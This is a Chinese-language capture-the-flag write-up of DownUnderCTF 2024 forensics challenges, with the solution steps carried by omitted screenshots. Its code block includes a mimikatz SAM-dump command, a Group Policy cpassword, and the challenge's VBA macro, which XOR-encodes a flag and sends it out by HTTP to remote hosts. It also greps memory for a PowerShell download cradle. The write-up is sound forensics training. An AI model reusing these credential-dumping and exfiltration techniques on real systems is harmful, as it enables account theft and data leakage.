# DownUnderCTF 2024——取证方向题解

> 原文: https://www.ctfiot.com/196634.html
> ID: 196634

DownUnderCTF 2024——取证方向题解

前言

经常参加取证赛事，跟CTF中的取证有很大差别，就想着整理一下CTF中的取证题，偶然发现有个国际赛专有方向的取证方向，就拿来复现一下

01

Baby’s First Forensics

题目描述

They’ve been trying to breach our infrastructure all morning! They’re trying to get more info on our covert kangaroos! We need your help, we’ve captured some traffic of them attacking us, can you tell us what tool they were using and its version?
NOTE: Wrap your answer in the DUCTF{}, e.g. DUCTF{nmap_7.25}

他们整个上午都在试图破坏我们的基础设施！他们正试图获得更多关于我们秘密袋鼠的信息！我们需要您的帮助，我们已经捕获了一些他们攻击我们的流量，您能告诉我们他们使用的是什么工具及其版本吗？
注意：将您的答案包装在 DUCTF{} 中，例如 DUCTF{nmap_7.25}

解题过程

02

SAM I AM

题目描述

The attacker managed to gain Domain Admin on our rebels Domain Controller! Looks like they managed to log on with an account using WMI and dumped some files. Can you reproduce how they got the Administrator’s Password with the artifacts provided?
Place the Administrator Account’s Password in DUCTF{}, e.g. DUCTF{password123!}

攻击者设法在我们的反叛者域控制器上获得了域管理员！看起来他们设法使用 WMI 使用帐户登录并转储了一些文件。您能否重现他们如何使用提供的工件获得管理员密码？
将管理员帐户的密码放在 DUCTF{} 中，例如 DUCTF{password123!}

解题过程

03

Bad Policies

题目描述

Looks like the attacker managed to access the rebels Domain Controller.
Can you figure out how they got access after pulling these artifacts from one of our Outpost machines?

看起来攻击者设法访问了反叛分子的域控制器。
你能弄清楚他们是如何从我们的一台 Outpost 机器中提取这些文物后获得访问权限的吗？

解题过程

04

emuc2

题目描述

As all good nation states, we have our own malware and C2 for offensive operations. But someone has got the source code and is using it against us! Here’s a capture of traffic we found on one of our laptops…

与所有优秀的民族国家一样，我们有自己的恶意软件和 C2 用于进攻性操作。但是有人得到了源代码，并用它来对付我们！这是我们在一台笔记本电脑上发现的流量捕获……
附件：sslkeylogfile.txt 、challenge.pcap

解题过程

05

Macro Magic

题目描述

We managed to pull this excel spreadsheet artifact from one of our Outpost machines. Its got something sus happening under the hood. After opening we found and captured some suspicious traffic on our network. Can you find out what this traffic is and find the flag!

我们成功地从一个前哨机器上提取了这个Excel电子表格文件。它在内部有些可疑的活动。打开后，我们在我们的网络上发现了一些可疑的流量。你能找出这些流量是什么，并找到旗帜吗?

注意：您不需要运行或启用宏，因此请解决。

解题过程

06

Lost in Memory

题目描述

Looks like one of our Emu soldiers ran something on an Outpost machine and now it’s doing strange things.
We took a memory dump as a precaution. Can you tell us whats going on?
This challenge has four parts to combine into the final flag with _ between each answer.
Find all four answers and combine them into the flag as all lower case like DUCTF{answer1_answer2_answer3_answer4}
eg. DUCTF{malicious.xlsm_invoke-mimikatz_malware.exe-malware2.exe_strong-password123}

1. What was the name of the malicious executable? eg malicious.xlsm
2. What was the name of the powershell module used? eg invoke-mimikatz
3. What were the names of the two files executed from the malicious executable (In alphabetical order with – in between and no spaces)? eg malware.exe-malware2.exe
4. What was the password of the new account created through powershell? eg strong-password123

看起来我们的一位Emu士兵在前哨机器上运行了一些东西，现在它开始表现出一些奇怪的事情。我们作为预防措施进行了内存转储。你能告诉我们发生了什么吗？
这个挑战有四个部分需要组合成最终的旗帜，每个答案之间用下划线连接。找到所有四个答案并将它们组合成旗帜，全部用小写字母，格式如下：DUCTF{answer1_answer2_answer3_answer4}
例如：DUCTF{malicious.xlsm_invoke-mimikatz_malware.exe-malware2.exe_strong-password123}

1. 恶意可执行文件的名称是什么？例如：malicious.xlsm
2. 使用的PowerShell模块名称是什么？例如：invoke-mimikatz
3. 从恶意可执行文件执行的两个文件的名称是什么（按字母顺序排列，中间用连字符连接，没有空格）？
例如：malware.exe-malware2.exe
4.通过PowerShell创建的新账户的密码是什么？例如：strong-password123

解题过程

总结

总体评价是新颖，知识点也很细，不靠联网是做不出来的，做CTF的取证题还是讲究积累，不然遇上这种题目就是一头雾水，做完很有成就感，也学到了很多妙妙小工具，再接再厉！

END


```
lsadump::
sam /sam:
sam.bak /system:
system.bak
cpassword="B+iL/dnbBHSlVf66R8HOuAiGHAtFOVLZwXu0FYf+jQ6553UUgGNwSZucgdz98klzBuFqKtTpO1bRZIsrF8b4Hu5n6KccA7SBWlbLBWnLXAkPquHFwdC70HXBcRlz38q2"
pip install -U oletools
Public Function anotherThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    anotherThing = A
End Function

Public Function importantThing()
    Dim tempString As String
    Dim tempInteger As Integer
    Dim I As Integer
    Dim J As Integer
    For I = 1 To 5
        Cells(I, 2).Value = WorksheetFunction.RandBetween(0, 1000)
    Next I
    For I = 1 To 5
        For J = I + 1 To 5
            If Cells(J, 2).Value < Cells(I, 2).Value Then
                tempString = Cells(I, 1).Value
                Cells(I, 1).Value = Cells(J, 1).Value
                Cells(J, 1).Value = tempString
                tempInteger = Cells(I, 2).Value
                Cells(I, 2).Value = Cells(J, 2).Value
                Cells(J, 2).Value = tempInteger
            End If
        Next J
    Next I
End Function

Public Function totalyFine(A As String) As String
    Dim B As String
    B = Replace(A, " ", "-")
    totalyFine = B
End Function

Sub macro1()
    Dim Path As String
    Dim wb As Workbook
    Dim A As String
    Dim B As String
    Dim C As String
    Dim D As String
    Dim E As String
    Dim F As String
    Dim G As String
    Dim H As String
    Dim J As String
    Dim K As String
    Dim L As String
    Dim M As String
    Dim N As String
    Dim O As String
    Dim P As String
    Dim Q As String
    Dim R As String
    Dim S As String
    Dim T As String
    Dim U As String
    Dim V As String
    Dim W As String
    Dim X As String
    Dim Y As String
    Dim Z As String
    Dim I As Long

    N = importantThing()
    K = "Yes"
    S = "Mon"
    U = forensics(K)
    V = totalyFine(U)
    D = "Ma"
    J = "https://play.duc.tf/" + V
    superThing J
    J = "http://flag.com/"
    superThing J
    G = "key"
    J = "http://play.duc.tf/"
    superThing J
    J = "http://en.wikipedia.org/wiki/Emu_War"
    superThing J
    N = importantThing()
    Path = ThisWorkbook.Path & "flag.xlsx"
    Set wb = Workbooks.Open(Path)
    Dim valueA1 As Variant
    valueA1 = wb.Sheets(1).Range("A1").Value
    MsgBox valueA1
    wb.Close SaveChanges:=False
    F = "gic"
    N = importantThing()
    Q = "Flag: " & valueA1
    H = "Try Harder"
    U = forensics(H)
    V = totalyFine(U)
    J = "http://downunderctf.com/" + V
    superThing J
    W = S + G + D + F
    O = doThing(Q, W)
    M = anotherThing(O, W)
    A = something(O)
    Z = forensics(O)
    N = importantThing()
    P = "Pterodactyl"
    U = forensics(P)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing J
    T = totalyFine(Z)
    MsgBox T
    J = "http://downunderctf.com/" + T
    superThing J
    N = importantThing()
    E = "Forensics"
    U = forensics(E)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing J
End Sub

Public Function doThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    doThing = A
End Function

Public Function superThing(ByVal A As String) As String
    With CreateObject("MSXML2.ServerXMLHTTP.6.0")
        .Open "GET", A, False
        .Send
        superThing = StrConv(.responseBody, vbUnicode)
    End With
End Function

Public Function something(B As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(inputText)
        A = A & WorksheetFunction.Dec2Bin(Asc(Mid(B, I, 1)))
    Next I
    something = A
End Function

Public Function forensics(B As String) As String
    Dim A() As Byte
    Dim I As Integer
    Dim C As String
    A = StrConv(B, vbFromUnicode)
    For I = LBound(A) To UBound(A)
        C = C & CStr(A(I)) & " "
    Next I
    C = Trim(C)
    forensics = C
End Function
W = S + G + D + F
    O = doThing(Q, W)
    M = anotherThing(O, W)
S = "Mon"
    G = "key"
    D = "Ma"
    F = "gic"
    W = "MonkeyMagic"
def decode(encoded, key):
    a = ''.join(chr(encoded[i] ^ ord(key[(i) % len(key)])) for i in range(len(encoded)))
    return a

m = [11, 3, 15, 12, 95, 89, 9, 52, 36, 61, 37, 54, 34, 90, 15, 86, 38, 26, 80, 19, 1, 60, 12, 38, 49, 9, 28, 38, 0, 81, 9, 2, 80, 52, 28, 19]
key = "MonkeyMagic"

flag = decode(m, key)
print(flag)
python2 vol.py -f 1.raw --profile=Win7SP1x86_23418 memdump -p 1136 --dump-dir .
strings 1136.dmp | grep "iex (New-Object net.we"
strings 1136.dmp | grep "powershell"
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/10-1722387310.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/8-1722387311.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/7-1722387311.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/1-1722387312.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/7-1722387312.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/2-1722387313.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/5-1722387314.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/0-1722387315.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/4-1722387316.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/7-1722387317.png)